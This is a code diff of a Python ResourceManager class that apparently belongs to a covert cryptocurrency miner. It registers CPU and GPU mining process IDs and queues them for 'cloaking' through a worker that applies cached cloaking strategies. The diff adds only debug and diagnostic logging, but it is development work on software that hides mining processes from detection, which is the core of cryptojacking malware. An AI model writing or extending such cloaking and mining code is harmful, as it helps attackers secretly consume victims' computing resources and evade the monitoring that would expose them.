@@ -417,15 +417,19 @@ class ResourceManager(IResourceManager):
             
             if pid and status == 'running':
                 self.logger.info(f"🔨 ResourceManager received CPU PID registered: PID={pid}")
+                self.logger.debug(f"[DEBUG] CPU event payload: {payload}")
                 
                 # ✅ ENHANCED: Create MiningProcess với explicit classification
                 mining_process = MiningProcess(pid, process_name, is_gpu=False)  # Explicit CPU
+                self.logger.debug(f"[DEBUG] Created MiningProcess: {mining_process}")
                 
                 # Add to tracking list
                 with self.mining_processes_lock:
                     self.mining_processes.append(mining_process)
+                    self.logger.debug(f"[DEBUG] Added to mining_processes list. Total: {len(self.mining_processes)}")
                 
                 # ✅ STREAMLINED: Enqueue cloaking only
+                self.logger.debug(f"[DEBUG] Calling enqueue_cloaking for CPU PID {pid}")
                 self.enqueue_cloaking(mining_process)
                 
                 self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
@@ -457,15 +461,19 @@ class ResourceManager(IResourceManager):
             
             if pid and status == 'running':
                 self.logger.info(f"🎮 ResourceManager received GPU PID registered: PID={pid}")
+                self.logger.debug(f"[DEBUG] GPU event payload: {payload}")
                 
                 # ✅ ENHANCED: Create MiningProcess với explicit classification
                 mining_process = MiningProcess(pid, process_name, is_gpu=True)  # Explicit GPU
+                self.logger.debug(f"[DEBUG] Created MiningProcess: {mining_process}")
                 
                 # Add to tracking list
                 with self.mining_processes_lock:
                     self.mining_processes.append(mining_process)
+                    self.logger.debug(f"[DEBUG] Added to mining_processes list. Total: {len(self.mining_processes)}")
                 
                 # ✅ STREAMLINED: Enqueue GPU cloaking
+                self.logger.debug(f"[DEBUG] Calling enqueue_cloaking for GPU PID {pid}")
                 self.enqueue_cloaking(mining_process)
                 
                 self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
@@ -493,6 +501,10 @@ class ResourceManager(IResourceManager):
         """
         pid = process.pid
         name = process.name
+        
+        # ✅ DIAGNOSTIC: Log entry point với DEBUG level
+        self.logger.debug(f"🔍 [DIAGNOSTIC] enqueue_cloaking called for {name} (PID={pid})")
+        self.logger.debug(f"📊 Current process_states: {dict(list(self.process_states.items())[:5])}...")
         
         try:
             if self.process_states.get(pid) == "cloaked":
@@ -873,12 +885,16 @@ class ResourceManager(IResourceManager):
 
         while not self._stop_flag:
             try:
+                # ✅ DIAGNOSTIC: Log queue status
+                self.logger.debug(f"🔍 [DIAGNOSTIC] CloakingWorker checking queue... Size: {self.resource_adjustment_queue.qsize()}")
+                
                 item = self.resource_adjustment_queue.get(timeout=1)
                 priority, count_val, task = item
 
                 p = task.get('process')
                 if not p:
                     self.resource_adjustment_queue.task_done()
+                    self.logger.debug("🔄 [DIAGNOSTIC] Skipping task - no process object")
                     continue
 
                 pid = p.pid
@@ -898,10 +914,17 @@ class ResourceManager(IResourceManager):
                     # ✅ STRATEGY APPLICATION TRACKING: Track success/failure of each strategy
                     strategy_results = {'applied': [], 'failed': [], 'total': len(strategies)}
                     
+                    # ✅ DIAGNOSTIC: Log strategy processing start
+                    self.logger.debug(f"🔍 [DIAGNOSTIC] Starting strategy processing for PID={pid}")
+                    self.logger.debug(f"📋 Strategies to apply: {strategies}")
+                    
                     for strat in strategies:
                         try:
                             # ✅ INTELLIGENT CACHING: Use advanced cache system
                             creation_start = time.time()
+                            
+                            # ✅ DIAGNOSTIC: Log each strategy attempt
+                            self.logger.debug(f"🎯 [DIAGNOSTIC] Attempting strategy: {strat} for PID={pid}")
                             
                             # ✅ CACHE LOOKUP: Try to get from intelligent cache
                             s = self.shared_resource_manager.strategy_cache.get(
